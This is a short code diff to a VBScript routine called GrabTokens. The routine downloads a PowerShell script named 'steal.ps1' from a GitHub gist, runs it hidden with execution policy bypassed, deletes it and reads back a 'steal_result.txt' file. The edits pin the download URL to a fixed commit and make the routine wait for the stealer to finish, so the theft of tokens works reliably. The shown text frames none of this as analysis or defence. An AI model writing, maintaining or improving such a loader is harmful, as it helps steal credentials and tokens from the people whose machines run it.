@@ -279,7 +279,7 @@ End Sub
 Sub GrabTokens()
     Dim xh: Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     xh.SetOption 2, 13056
-    xh.Open "GET", "https://gist.githubusercontent.com/lozix94-afk/6f9a82f866d336ee4f1527fb54fd0c83/raw/steal.ps1?v=1000", False
+    xh.Open "GET", "https://gist.githubusercontent.com/lozix94-afk/6f9a82f866d336ee4f1527fb54fd0c83/raw/d397d274322fdebdb5e4f7821416633baecceafa/steal.ps1", False
     xh.Send
     If xh.Status <> 200 Then Exit Sub
     Dim pc: pc = xh.responseText
@@ -288,7 +288,7 @@ Sub GrabTokens()
     
     Dim psf: psf = TmpFile("steal.ps1")
     WriteFile psf, pc
-    sh.Run "cmd /c powershell -NoP -Exec Bypass -File """ & psf & """", 0, False
+    sh.Run "cmd /c powershell -NoP -Exec Bypass -File """ & psf & """", 0, True
     fso.DeleteFile psf, True
     
     Dim tf: tf = TmpFile("steal_result.txt")
